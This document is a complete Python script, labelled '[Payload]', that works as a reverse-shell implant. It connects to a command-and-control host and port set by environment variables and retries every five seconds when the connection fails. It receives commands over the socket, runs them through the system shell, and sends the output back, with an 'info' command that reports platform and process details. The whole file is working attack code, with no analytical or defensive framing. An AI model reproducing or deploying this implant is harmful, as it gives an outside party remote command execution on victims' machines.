#!/usr/bin/env python3
import socket
import sys
import os
import time
import subprocess
import json

def main():
    print("[Payload] Starting...")
    
    # Connect to C2
    host = os.getenv('C2_HOST', '127.0.0.1')
    port = int(os.getenv('C2_PORT', '4040'))
    
    # TODO: Ensure loop has proper exit condition
    while True:
        try:
            sock = socket.socket()
            sock.connect((host, port))
            print(f"[Payload] Connected to {host}:{port}")
            
            # Simple command loop
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                    
                cmd = data.decode().strip()
                
                if cmd == 'exit':
                    break
                elif cmd == 'info':
                    output = json.dumps({
                        'platform': sys.platform,
                        'executable': sys.executable,
                        'pid': os.getpid()
                    })
                else:
                    try:
                        output = subprocess.check_output(cmd, shell=True, timeout=10)
                        output = output.decode()
                    except Exception as e:
                        output = str(e)
                
                sock.send(output.encode())
                
            sock.close()
            
        except Exception as e:
            print(f"[Payload] Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
